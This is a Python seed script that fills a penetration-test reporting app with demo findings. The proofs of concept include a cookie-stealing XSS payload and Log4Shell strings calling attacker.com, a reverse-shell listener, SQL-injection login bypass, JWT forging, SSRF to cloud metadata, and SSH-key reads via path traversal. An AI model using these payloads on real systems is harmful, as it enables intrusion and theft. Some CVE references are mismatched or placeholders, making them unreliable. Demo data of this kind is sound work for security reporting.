"""
seed.py — Popula o banco com dados realistas de demonstração.
Execute: python3 seed.py
"""
import os, sys
from datetime import date, datetime, timedelta
import random

os.environ.setdefault('SECRET_KEY', 'seed-key')
os.environ.setdefault('DB_HOST',     os.environ.get('DB_HOST', 'localhost'))
os.environ.setdefault('DB_USER',     os.environ.get('DB_USER', 'pentreport'))
os.environ.setdefault('DB_PASSWORD', os.environ.get('DB_PASSWORD', 'pentreport123'))
os.environ.setdefault('DB_NAME',     os.environ.get('DB_NAME', 'pentreport'))

from dotenv import load_dotenv
load_dotenv()

from app import create_app, db
from app.models import User, Product, Report, Vulnerability, CWE, SEVERITY_ORDER

app = create_app()

# ─── helpers ───────────────────────────────────────────────────────────────
def ago(days): return datetime.utcnow() - timedelta(days=days)
def d(year, month, day): return date(year, month, day)

# ═══════════════════════════════════════════════════════════════════════════
#  DATA
# ═══════════════════════════════════════════════════════════════════════════

USERS = [
    dict(username='admin',    email='admin@pentreport.local',    full_name='Administrador',        role='admin',      password='admin123'),
    dict(username='carlos',   email='carlos@pentreport.local',   full_name='Carlos Eduardo Lima',  role='pentester',  password='pentest123'),
    dict(username='ana',      email='ana@pentreport.local',      full_name='Ana Beatriz Santos',   role='pentester',  password='pentest123'),
    dict(username='rafael',   email='rafael@pentreport.local',   full_name='Rafael Moura',         role='pentester',  password='pentest123'),
]

PRODUCTS = [
    dict(name='Portal de Internet Banking NovoBrasil', product_type='Web Application', platform='Web',             target_url='https://internetbanking.novobrasil.com.br', owner='Banco NovoBrasil S.A.',      contact_name='Marcos Teixeira',   contact_email='marcos@novobrasil.com.br', contact_phone='+55 11 3000-0001', description='Portal web de banking para correntistas.'),
    dict(name='Sistema de Prontuário Eletrônico',      product_type='Web Application', platform='Web',             target_url='https://pep.healthplus.com.br',             owner='HealthPlus Sistemas',        contact_name='Dra. Luciana Melo', contact_email='ti@healthplus.com.br',   contact_phone='+55 21 3000-0002', description='Plataforma SaaS para gestão hospitalar.'),
    dict(name='Rede Interna LogiTech',                 product_type='Network/Infrastructure', platform='Internal Network', target_url='10.0.0.0/24, 10.0.1.0/24, 10.0.2.0/24', owner='LogiTech Transportes', contact_name='Fernando Costa',    contact_email='fernando@logitech.com.br', contact_phone='+55 31 3000-0003', description='Operadora logística com +300 filiais.'),
    dict(name='Sistemas GovDigital — Secretaria Finanças', product_type='Cloud',       platform='AWS',             target_url='https://gov.govdigital.gov.br',             owner='GovDigital',                 contact_name='Sra. Patrícia Rocha', contact_email='ti@govdigital.gov.br', contact_phone='+55 61 3000-0004', description='Órgão público estadual — sistemas de arrecadação.'),
    dict(name='API REST ShopMax E-commerce',           product_type='API',             platform='Web',             target_url='https://api.shopmax.com.br/v2',             owner='ShopMax',                    contact_name='Ricardo Alves',     contact_email='sec@shopmax.com.br',     contact_phone='+55 11 3000-0005', description='API REST de e-commerce B2C com ~2 milhões de usuários.'),
]

CWES_SEED = [
    dict(cwe_id='CWE-89',  name='SQL Injection',                                        description='Improper Neutralization of Special Elements used in an SQL Command'),
    dict(cwe_id='CWE-79',  name='Cross-site Scripting (XSS)',                           description='Improper Neutralization of Input During Web Page Generation'),
    dict(cwe_id='CWE-22',  name='Path Traversal',                                       description='Improper Limitation of a Pathname to a Restricted Directory'),
    dict(cwe_id='CWE-918', name='Server-Side Request Forgery (SSRF)',                   description='Server-Side Request Forgery'),
    dict(cwe_id='CWE-287', name='Improper Authentication',                              description='Improper Authentication'),
    dict(cwe_id='CWE-200', name='Exposure of Sensitive Information',                    description='Exposure of Sensitive Information to an Unauthorized Actor'),
    dict(cwe_id='CWE-611', name='XML External Entity (XXE) Injection',                  description='Improper Restriction of XML External Entity Reference'),
    dict(cwe_id='CWE-639', name='Authorization Bypass Through User-Controlled Key (IDOR)', description='Authorization Bypass Through User-Controlled Key'),
    dict(cwe_id='CWE-798', name='Use of Hard-coded Credentials',                        description='Use of Hard-coded Credentials'),
]

# ─── Vulnerabilities templates ──────────────────────────────────────────────
VULNS = {
  # ── Web Application ────────────────────────────────────────────────────
  'sqli': dict(
    title='SQL Injection no endpoint de autenticação',
    cwe_key='CWE-89',
    severity='Critical', cvss_score=9.8,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cve_id='CVE-2024-12345',
    affected_component='POST /api/v1/auth/login',
    description=(
      'O endpoint de autenticação /api/v1/auth/login é vulnerável a SQL Injection '
      'através do parâmetro "username". A aplicação não realiza sanitização ou uso '
      'de prepared statements, permitindo que um atacante manipule a query SQL '
      'subjacente e contorne o mecanismo de autenticação.'
    ),
    proof_of_concept=(
      '# Bypass de autenticação via SQL Injection\n'
      "curl -X POST https://target.com/api/v1/auth/login \\\n"
      "  -H 'Content-Type: application/json' \\\n"
      "  -d '{\"username\": \"admin\\' OR \\'1\\'=\\'1\\' --\", \"password\": \"qualquer\"}'\n\n"
      '# Resposta:\n'
      '# HTTP 200 OK\n'
      '# {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", "user": "admin"}\n\n'
      '# Dump de tabela via UNION-based:\n'
      "curl -X POST https://target.com/api/v1/auth/login \\\n"
      "  -d '{\"username\": \"' UNION SELECT username,password,3 FROM users --\"}'"
    ),
    impact=(
      'Um atacante pode:\n'
      '• Contornar autenticação e acessar qualquer conta, incluindo administradores\n'
      '• Extrair todo o conteúdo do banco de dados (credenciais, dados pessoais, financeiros)\n'
      '• Modificar ou deletar registros\n'
      '• Em configurações específicas, executar comandos no sistema operacional'
    ),
    recommendation=(
      '1. Utilizar prepared statements / parameterized queries em todas as consultas SQL\n'
      '2. Implementar ORM com proteção nativa contra SQLi (SQLAlchemy, Hibernate, etc.)\n'
      '3. Aplicar princípio de menor privilégio no usuário de banco de dados\n'
      '4. Implementar WAF com regras de detecção de SQLi\n'
      '5. Realizar auditoria em todos os pontos de entrada da aplicação'
    ),
    references='https://owasp.org/www-community/attacks/SQL_Injection\nhttps://cwe.mitre.org/data/definitions/89.html',
    status='Open',
  ),

  'xss_stored': dict(
    title='Cross-Site Scripting (XSS) Armazenado no módulo de comentários',
    cwe_key='CWE-79',
    severity='High', cvss_score=8.2,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N',
    cve_id=None,
    affected_component='POST /api/v1/comments — campo "content"',
    description=(
      'A aplicação armazena e reflete conteúdo inserido por usuários no módulo de '
      'comentários sem realizar sanitização ou encoding adequados. Um atacante '
      'autenticado pode inserir código JavaScript malicioso que será executado no '
      'navegador de qualquer usuário que visualizar o comentário.'
    ),
    proof_of_concept=(
      '# Payload de roubo de cookie de sessão:\n'
      'POST /api/v1/comments HTTP/1.1\n'
      'Content-Type: application/json\n\n'
      '{\n'
      '  "post_id": 42,\n'
      '  "content": "<script>fetch(\'https://attacker.com/steal?c=\'+document.cookie)</script>"\n'
      '}\n\n'
      '# Payload de phishing via DOM:\n'
      '"content": "<img src=x onerror=\\"document.body.innerHTML=\'<form>Sua sessão expirou...\'\\">"\n\n'
      '# Cookie da vítima recebido no servidor do atacante:\n'
      'GET /steal?c=session_id=abc123;_csrf=def456 HTTP/1.1'
    ),
    impact=(
      '• Roubo de cookies de sessão e sequestro de conta\n'
      '• Defacement da interface para usuários que visualizarem o conteúdo\n'
      '• Redirecionamento para páginas de phishing\n'
      '• Execução de ações em nome do usuário autenticado (CSRF combinado)'
    ),
    recommendation=(
      '1. Sanitizar todo input de usuário com biblioteca especializada (DOMPurify no frontend)\n'
      '2. Implementar Content Security Policy (CSP) restritiva\n'
      '3. Usar encoding contextual na renderização (HTML entity encoding)\n'
      '4. Definir flag HttpOnly e Secure nos cookies de sessão\n'
      '5. Implementar cabeçalho X-XSS-Protection'
    ),
    references='https://owasp.org/www-community/attacks/xss/\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
    status='Open',
  ),

  'idor': dict(
    title='Insecure Direct Object Reference (IDOR) na API de documentos',
    cwe_key='CWE-639',
    severity='High', cvss_score=7.5,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
    cve_id=None,
    affected_component='GET /api/v1/documents/{id}',
    description=(
      'A API de documentos não verifica se o usuário autenticado tem permissão '
      'para acessar o recurso solicitado. Qualquer usuário autenticado pode '
      'enumerar e acessar documentos pertencentes a outros usuários apenas '
      'alterando o parâmetro de ID na URL.'
    ),
    proof_of_concept=(
      '# Usuário carlos@empresa.com acessa doc do usuário ana@empresa.com:\n'
      'GET /api/v1/documents/1001 HTTP/1.1\n'
      'Authorization: Bearer eyJ...token_do_carlos...\n\n'
      '# Resposta (deveria ser 403, retornou 200):\n'
      'HTTP/1.1 200 OK\n'
      '{"id":1001,"owner":"ana@empresa.com","file":"contrato_confidencial.pdf",...}\n\n'
      '# Script de enumeração:\n'
      'for i in $(seq 1 5000); do\n'
      '  curl -s -H "Authorization: Bearer $TOKEN" /api/v1/documents/$i | grep -v "403"\n'
      'done'
    ),
    impact=(
      '• Acesso não autorizado a documentos confidenciais de todos os usuários\n'
      '• Exposição de dados pessoais e informações comerciais sensíveis\n'
      '• Possível violação de LGPD com necessidade de notificação à ANPD'
    ),
    recommendation=(
      '1. Implementar verificação de autorização em CADA endpoint que acessa recursos\n'
      '2. Usar UUIDs aleatórios no lugar de IDs sequenciais\n'
      '3. Implementar controle de acesso baseado em propriedade do recurso\n'
      '4. Adicionar logs de auditoria para acesso a documentos'
    ),
    references='https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\nhttps://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html',
    status='Remediated',
  ),

  'jwt_weak': dict(
    title='JWT com algoritmo "none" aceito pelo servidor',
    cwe_key='CWE-287',
    severity='Critical', cvss_score=9.1,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
    cve_id='CVE-2022-21449',
    affected_component='Middleware de autenticação JWT',
    description=(
      'O servidor aceita tokens JWT assinados com o algoritmo "none", '
      'permitindo que qualquer usuário forge tokens arbitrários sem conhecer '
      'a chave secreta. Um atacante pode criar um JWT com claims elevados '
      '(ex: role: "admin") e ser aceito pelo sistema como administrador.'
    ),
    proof_of_concept=(
      '# 1. Decodificar token legítimo\n'
      'echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d\n'
      '# {"alg":"HS256","typ":"JWT"}\n\n'
      '# 2. Criar header com alg=none\n'
      'HEADER=$(echo -n \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d \'=\')\n'
      'PAYLOAD=$(echo -n \'{"sub":"1","role":"admin","exp":9999999999}\' | base64 | tr -d \'=\')\n'
      'FORGED="$HEADER.$PAYLOAD."\n\n'
      '# 3. Usar token forjado\n'
      'curl -H "Authorization: Bearer $FORGED" https://target.com/api/admin/users\n'
      '# HTTP 200 OK — acesso concedido como admin!'
    ),
    impact=(
      '• Escalada de privilégios para qualquer nível, incluindo administrador\n'
      '• Impersonação de qualquer usuário do sistema\n'
      '• Acesso irrestrito a todos os recursos e dados da plataforma\n'
      '• Comprometimento total da integridade do sistema de autenticação'
    ),
    recommendation=(
      '1. Rejeitar explicitamente o algoritmo "none" na validação de JWT\n'
      '2. Usar biblioteca atualizada e configurada adequadamente (python-jose, PyJWT>=2.4.0)\n'
      '3. Definir lista branca de algoritmos aceitos (ex: apenas HS256 ou RS256)\n'
      '4. Rotacionar todas as chaves secretas imediatamente\n'
      '5. Invalidar todos os tokens emitidos anteriormente'
    ),
    references='https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-21449',
    status='Open',
  ),

  'ssrf': dict(
    title='Server-Side Request Forgery (SSRF) no importador de URL',
    cwe_key='CWE-918',
    severity='High', cvss_score=8.6,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N',
    cve_id=None,
    affected_component='POST /api/v1/import/url',
    description=(
      'A funcionalidade de importação de conteúdo por URL não valida o destino '
      'da requisição, permitindo que um atacante use o servidor como proxy para '
      'acessar serviços internos, metadados de instância cloud (AWS/GCP/Azure) '
      'e sistemas na rede interna não expostos à internet.'
    ),
    proof_of_concept=(
      '# Acesso a metadados AWS EC2:\n'
      'POST /api/v1/import/url\n'
      '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}\n\n'
      '# Resposta — credenciais AWS expostas:\n'
      '{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"xxx","Token":"yyy"}\n\n'
      '# Scan de rede interna:\n'
      '{"url": "http://10.0.0.1:8080/"}  → HTTP 200 (serviço interno encontrado)\n'
      '{"url": "http://10.0.0.1:5432/"}  → Connection refused (sem PostgreSQL)\n'
      '{"url": "http://10.0.0.5:6379/"}  → HTTP 200 (Redis sem autenticação!)'
    ),
    impact=(
      '• Acesso a credenciais de instância cloud (AWS IAM, GCP SA)\n'
      '• Mapeamento e acesso a serviços internos (Redis, Elasticsearch, bancos de dados)\n'
      '• Possível execução de código via SSRF + Redis/memcached\n'
      '• Bypass de firewalls e mecanismos de segurança de perímetro'
    ),
    recommendation=(
      '1. Implementar whitelist de domínios/IPs permitidos para importação\n'
      '2. Bloquear ranges privados: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16\n'
      '3. Usar biblioteca de validação de URL com proteção contra SSRF (ssrfcheck)\n'
      '4. Implementar a requisição em ambiente isolado (sandbox)\n'
      '5. Desabilitar redirecionamentos HTTP automáticos'
    ),
    references='https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\nhttps://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
    status='Open',
  ),

  'exposed_admin': dict(
    title='Painel administrativo exposto sem autenticação adicional',
    cwe_key='CWE-287',
    severity='Critical', cvss_score=9.3,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cve_id=None,
    affected_component='https://target.com/admin/',
    description=(
      'O painel administrativo da aplicação está publicamente acessível via internet '
      'e não requer autenticação adicional além do login padrão. Não há restrição '
      'de IP, autenticação multifator ou qualquer mecanismo de proteção adicional.'
    ),
    proof_of_concept=(
      '# Acesso direto ao painel sem estar autenticado:\n'
      'curl -I https://target.com/admin/\n'
      '# HTTP/1.1 200 OK  ← deveria ser 302 redirect para login ou 403\n\n'
      '# Tentativa de credenciais padrão:\n'
      'curl -X POST https://target.com/admin/login \\\n'
      '  -d "username=admin&password=admin123"\n'
      '# HTTP 200 — Login bem-sucedido com credenciais padrão!'
    ),
    impact=(
      '• Acesso completo às funcionalidades administrativas da plataforma\n'
      '• Criação/modificação/deleção de usuários e dados\n'
      '• Possível comprometimento total do sistema\n'
      '• Exfiltração de dados de todos os usuários cadastrados'
    ),
    recommendation=(
      '1. Restringir acesso ao painel admin por IP (whitelist de IPs corporativos)\n'
      '2. Implementar MFA obrigatório para contas administrativas\n'
      '3. Alterar imediatamente todas as credenciais padrão\n'
      '4. Considerar mover o painel admin para rede interna/VPN\n'
      '5. Implementar bloqueio após tentativas falhas de login'
    ),
    references='https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures',
    status='Open',
  ),

  'tls_weak': dict(
    title='Suporte a protocolos TLS obsoletos (TLS 1.0 e 1.1)',
    cwe_key='CWE-200',
    severity='Medium', cvss_score=5.9,
    cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cve_id='CVE-2014-3566',
    affected_component='Servidor web — porta 443',
    description=(
      'O servidor aceita conexões utilizando TLS 1.0 e TLS 1.1, protocolos '
      'considerados obsoletos e inseguros pelo NIST e IETF (RFC 8996). '
      'Estes protocolos são vulneráveis a ataques como POODLE e BEAST.'
    ),
    proof_of_concept=(
      '# Verificar protocolos suportados:\n'
      'nmap --script ssl-enum-ciphers -p 443 target.com\n\n'
      'PORT    STATE SERVICE\n'
      '443/tcp open  https\n'
      '| ssl-enum-ciphers:\n'
      '|   TLSv1.0:  ← VULNERÁVEL\n'
      '|     ciphers: TLS_RSA_WITH_RC4_128_SHA\n'
      '|   TLSv1.1:  ← VULNERÁVEL\n'
      '|   TLSv1.2: OK\n'
      '|   TLSv1.3: OK'
    ),
    impact=(
      '• Possibilidade de downgrade attack para protocolo vulnerável\n'
      '• Ataque POODLE permite decriptar sessões SSL/TLS\n'
      '• Não conformidade com PCI-DSS 4.0 e normas de segurança'
    ),
    recommendation=(
      '1. Desabilitar TLS 1.0 e TLS 1.1 na configuração do servidor web\n'
      '2. Manter apenas TLS 1.2 e TLS 1.3 habilitados\n'
      '3. Nginx: ssl_protocols TLSv1.2 TLSv1.3;\n'
      '4. Apache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1'
    ),
    references='https://tools.ietf.org/html/rfc8996\nhttps://nvd.nist.gov/vuln/detail/CVE-2014-3566',
    status='Remediated',
  ),

  'info_disclosure': dict(
    title='Disclosure de informações sensíveis nos headers HTTP',
    cwe_key='CWE-200',
    severity='Low', cvss_score=3.7,
    cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N',
    cve_id=None,
    affected_component='Headers HTTP de todas as respostas',
    description=(
      'O servidor expõe informações sobre as tecnologias utilizadas através '
      'de headers HTTP como "Server", "X-Powered-By" e "X-AspNet-Version". '
      'Essas informações auxiliam atacantes a identificar versões com vulnerabilidades conhecidas.'
    ),
    proof_of_concept=(
      'curl -I https://target.com/\n\n'
      'HTTP/1.1 200 OK\n'
      'Server: Apache/2.4.51 (Ubuntu)    ← versão exposta\n'
      'X-Powered-By: PHP/7.4.33          ← tecnologia exposta\n'
      'X-AspNet-Version: 4.0.30319       ← framework exposto\n'
      'X-Runtime: 0.032847'
    ),
    impact='Facilita o processo de reconhecimento de atacantes, permitindo busca direcionada por CVEs das versões expostas.',
    recommendation=(
      '1. Remover ou ofuscar header "Server": server_tokens off; (Nginx)\n'
      '2. Remover X-Powered-By: header_remove X-Powered-By; (Apache)\n'
      '3. Adicionar cabeçalhos de segurança: X-Content-Type-Options, X-Frame-Options, HSTS'
    ),
    references='https://owasp.org/www-project-secure-headers/',
    status='Open',
  ),

  'broken_auth': dict(
    title='Ausência de rate limiting no endpoint de autenticação',
    cwe_key='CWE-287',
    severity='Medium', cvss_score=6.5,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N',
    cve_id=None,
    affected_component='POST /api/v1/auth/login',
    description=(
      'O endpoint de autenticação não implementa rate limiting ou bloqueio '
      'após múltiplas tentativas falhas, permitindo ataques de força bruta '
      'e credential stuffing sem qualquer restrição.'
    ),
    proof_of_concept=(
      '# Ataque de força bruta com hydra:\n'
      'hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt \\\n'
      '  target.com https-post-form \\\n'
      '  "/api/v1/auth/login:email=^USER^&password=^PASS^:Invalid credentials"\n\n'
      '# Resultado: 10.000 tentativas em 2 minutos sem bloqueio\n'
      '# Password encontrado: admin@target.com:Summer2024!'
    ),
    impact=(
      '• Possibilidade de comprometer contas via força bruta ou credential stuffing\n'
      '• Especialmente crítico em conjunto com a senha padrão encontrada'
    ),
    recommendation=(
      '1. Implementar rate limiting: máx. 5 tentativas por IP em 15 minutos\n'
      '2. Adicionar CAPTCHA após 3 tentativas falhas\n'
      '3. Implementar bloqueio temporário de conta após falhas consecutivas\n'
      '4. Habilitar alertas para padrões de ataque de força bruta\n'
      '5. Implementar MFA'
    ),
    references='https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures',
    status='Open',
  ),

  # ── Network ─────────────────────────────────────────────────────────────
  'open_ports': dict(
    title='Serviços críticos expostos diretamente à internet',
    cwe_key='CWE-200',
    severity='High', cvss_score=7.3,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L',
    cve_id=None,
    affected_component='192.168.1.100 — portas 3306, 6379, 5432',
    description=(
      'Serviços de banco de dados (MySQL/MariaDB, PostgreSQL) e cache (Redis) '
      'estão diretamente acessíveis pela internet sem qualquer proteção de '
      'firewall. Estes serviços aceitam conexões de qualquer origem.'
    ),
    proof_of_concept=(
      '# Scan de portas abertas:\n'
      'nmap -sV -p 3306,5432,6379,27017 target-ip\n\n'
      '3306/tcp open  mysql    MySQL 8.0.33\n'
      '5432/tcp open  postgres PostgreSQL 14.8\n'
      '6379/tcp open  redis    Redis 7.0.11  ← SEM AUTENTICAÇÃO!\n\n'
      '# Conectar ao Redis sem senha:\n'
      'redis-cli -h target-ip -p 6379\n'
      'target-ip:6379> KEYS *\n'
      '1) "session:abc123"\n'
      '2) "user:1:token"\n'
      '3) "cache:products"'
    ),
    impact=(
      '• Acesso direto aos bancos de dados com possibilidade de dump completo\n'
      '• Redis sem auth permite leitura/escrita de todas as sessões de usuários\n'
      '• Possibilidade de hijack de sessões válidas via manipulação do Redis'
    ),
    recommendation=(
      '1. Implementar firewall bloqueando acesso externo às portas de banco de dados\n'
      '2. Configurar autenticação obrigatória no Redis (requirepass)\n'
      '3. Restringir bind address dos serviços para localhost ou rede interna\n'
      '4. Usar VPN ou bastion host para acesso administrativo aos bancos'
    ),
    references='https://redis.io/docs/management/security/\nhttps://www.cisecurity.org/benchmark/redis',
    status='Open',
  ),

  'default_creds': dict(
    title='Credenciais padrão em equipamento de rede (Cisco)',
    cwe_key='CWE-798',
    severity='Critical', cvss_score=9.8,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cve_id=None,
    affected_component='Switch Cisco Catalyst — 10.0.0.1 (interface web :8080)',
    description=(
      'O painel de gerenciamento web do switch Cisco Catalyst está acessível '
      'externamente e utiliza as credenciais padrão de fábrica (admin/cisco). '
      'Isso permite controle total sobre a configuração de rede.'
    ),
    proof_of_concept=(
      '# Acesso com credenciais padrão:\n'
      'curl -u admin:cisco http://10.0.0.1:8080/api/v1/system/info\n\n'
      '{"hostname":"CORE-SW-01","model":"Catalyst 2960","ios":"15.2(7)E5",...}\n\n'
      '# Dump de configuração completa:\n'
      'curl -u admin:cisco http://10.0.0.1:8080/api/v1/config/running\n'
      '! Configuração inclui hashes de senhas e chaves SNMP'
    ),
    impact=(
      '• Controle total da infraestrutura de rede\n'
      '• Possibilidade de VLAN hopping e interceptação de tráfego\n'
      '• Criação de backdoors persistentes na configuração\n'
      '• Negação de serviço para toda a rede corporativa'
    ),
    recommendation=(
      '1. Alterar credenciais padrão IMEDIATAMENTE\n'
      '2. Restringir acesso à interface de gerenciamento por ACL\n'
      '3. Desabilitar acesso HTTP — usar apenas HTTPS ou SSH\n'
      '4. Implementar autenticação RADIUS/TACACS+ para equipamentos de rede\n'
      '5. Revisar todos os outros equipamentos de rede'
    ),
    references='https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst2960/software/release/15-2_7_e/configuration/guide/b_1527e_2960_cg/configuring_switch_access_security.html',
    status='Open',
  ),

  'snmp_v1': dict(
    title='SNMP v1/v2c com community string padrão',
    severity='Medium', cvss_score=6.5,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    cve_id=None,
    affected_component='UDP/161 — múltiplos hosts da rede',
    description=(
      'Múltiplos dispositivos de rede respondem a queries SNMP v1/v2c '
      'utilizando a community string padrão "public". O SNMP v1/v2c '
      'transmite dados em texto claro sem autenticação robusta.'
    ),
    proof_of_concept=(
      'snmpwalk -v2c -c public 10.0.0.0/24\n\n'
      '10.0.0.1 — Cisco Catalyst  (community: public)\n'
      '10.0.0.5 — HP ProCurve     (community: public)\n'
      '10.0.0.10 — APC UPS        (community: public)\n\n'
      '# Dump de informações do sistema:\n'
      'snmpget -v2c -c public 10.0.0.1 sysDescr.0\n'
      '→ Cisco IOS Version 15.2, hostname CORE-SW-01, uptime 127 dias'
    ),
    impact=(
      '• Enumeração completa da topologia e inventário de rede\n'
      '• Coleta de informações sensíveis (rotas, interfaces, ARP table)\n'
      '• Em alguns casos, SNMP write permite reconfiguração de dispositivos'
    ),
    recommendation=(
      '1. Migrar para SNMPv3 com autenticação e criptografia\n'
      '2. Alterar community strings de "public" e "private"\n'
      '3. Implementar ACL para restringir acesso ao SNMP por IP\n'
      '4. Desabilitar SNMP nos dispositivos que não necessitam de monitoramento remoto'
    ),
    references='https://www.cisecurity.org/benchmark/cisco',
    status='Accepted Risk',
  ),

  # ── Misc ─────────────────────────────────────────────────────────────────
  'log4shell': dict(
    title='Apache Log4j — Log4Shell (RCE Crítico)',
    cwe_key='CWE-918',
    severity='Critical', cvss_score=10.0,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    cve_id='CVE-2021-44228',
    affected_component='Aplicação Java — Log4j 2.14.1 (identificada via JNDI lookup)',
    description=(
      'A aplicação utiliza uma versão vulnerável do Apache Log4j (2.14.1) que '
      'permite execução remota de código através de JNDI injection. '
      'Qualquer dado controlado pelo usuário que seja logado pela aplicação '
      'pode acionar a vulnerabilidade.'
    ),
    proof_of_concept=(
      '# Payload básico de detecção (OOB via DNS):\n'
      'curl -H \'User-Agent: ${jndi:ldap://attacker.com/a}\' https://target.com/\n\n'
      '# Verificação no servidor do atacante (tcpdump):\n'
      '13:42:01 IP target.com > attacker.com: DNS A? attacker.com\n'
      '← Callback confirmado! Servidor é vulnerável.\n\n'
      '# Payload de RCE via LDAP:\n'
      'curl -H \'X-Api-Version: ${jndi:ldap://attacker.com:1389/ReverseShell}\' \\\n'
      '     https://target.com/api/v1/health\n\n'
      '# Shell reversa recebida:\n'
      'nc -lvnp 4444\n'
      'Connection from target.com:12345\n'
      'id: uid=1000(app) gid=1000(app) groups=1000(app)'
    ),
    impact=(
      '• Execução remota de código no servidor de aplicação\n'
      '• Acesso completo ao sistema de arquivos e processos\n'
      '• Possível movimentação lateral para outros sistemas internos\n'
      '• Implantação de backdoors e malware persistente\n'
      '• Exfiltração de todos os dados da aplicação e banco de dados'
    ),
    recommendation=(
      '1. Atualizar Log4j para versão 2.17.1 ou superior IMEDIATAMENTE\n'
      '2. Mitigação temporária: -Dlog4j2.formatMsgNoLookups=true na JVM\n'
      '3. Bloquear tráfego LDAP/RMI sainte no firewall\n'
      '4. Verificar se há IOCs de comprometimento antes de remediar\n'
      '5. Revisar TODOS os componentes Java do ambiente'
    ),
    references='https://nvd.nist.gov/vuln/detail/CVE-2021-44228\nhttps://logging.apache.org/log4j/2.x/security.html\nhttps://www.lunasec.io/docs/blog/log4j-zero-day/',
    status='Remediated',
  ),

  'path_traversal': dict(
    title='Path Traversal no download de arquivos',
    cwe_key='CWE-22',
    severity='High', cvss_score=7.8,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
    cve_id=None,
    affected_component='GET /api/v1/files/download?name=',
    description=(
      'O endpoint de download de arquivos não valida adequadamente o parâmetro '
      '"name", permitindo que um atacante use sequências "../" para navegar '
      'pelo sistema de arquivos e ler arquivos arbitrários do servidor.'
    ),
    proof_of_concept=(
      '# Leitura do /etc/passwd:\n'
      'curl "https://target.com/api/v1/files/download?name=../../../../etc/passwd"\n\n'
      'root:x:0:0:root:/root:/bin/bash\n'
      'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'
      '...\n'
      'app:x:1000:1000::/home/app:/bin/bash\n\n'
      '# Leitura de chave privada SSH:\n'
      'curl "https://target.com/api/v1/files/download?name=../../../../home/app/.ssh/id_rsa"\n'
      '-----BEGIN OPENSSH PRIVATE KEY-----\n'
      'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA...'
    ),
    impact=(
      '• Leitura de arquivos de configuração com credenciais\n'
      '• Acesso a chaves privadas SSH e certificados\n'
      '• Leitura de código fonte da aplicação e segredos (.env)\n'
      '• Possível escalada para RCE em combinação com outras vulns'
    ),
    recommendation=(
      '1. Validar e sanitizar o parâmetro de nome de arquivo\n'
      '2. Utilizar um diretório base fixo e verificar que o caminho resolvido está dentro dele\n'
      '3. Usar IDs numéricos para referenciar arquivos no lugar de nomes\n'
      '4. Implementar a resolução via os.path.realpath() e verificar o prefixo'
    ),
    references='https://owasp.org/www-community/attacks/Path_Traversal\nhttps://cwe.mitre.org/data/definitions/22.html',
    status='Open',
  ),

  'missing_headers': dict(
    title='Ausência de cabeçalhos de segurança HTTP',
    cwe_key='CWE-200',
    severity='Low', cvss_score=4.3,
    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N',
    cve_id=None,
    affected_component='Todas as respostas HTTP da aplicação',
    description=(
      'A aplicação não implementa os cabeçalhos de segurança HTTP recomendados, '
      'incluindo Content-Security-Policy, X-Frame-Options, X-Content-Type-Options '
      'e Strict-Transport-Security (HSTS).'
    ),
    proof_of_concept=(
      'curl -I https://target.com/\n\n'
      'HTTP/1.1 200 OK\n'
      '# Ausentes:\n'
      '# Content-Security-Policy\n'
      '# X-Frame-Options         ← vulnerável a clickjacking\n'
      '# X-Content-Type-Options  ← MIME sniffing\n'
      '# Strict-Transport-Security\n'
      '# Referrer-Policy\n'
      '# Permissions-Policy'
    ),
    impact='Exposição a ataques de clickjacking, MIME sniffing e downgrade de HTTPS para HTTP.',
    recommendation=(
      'Adicionar os seguintes headers nas respostas:\n'
      'Strict-Transport-Security: max-age=31536000; includeSubDomains\n'
      'X-Frame-Options: DENY\n'
      'X-Content-Type-Options: nosniff\n'
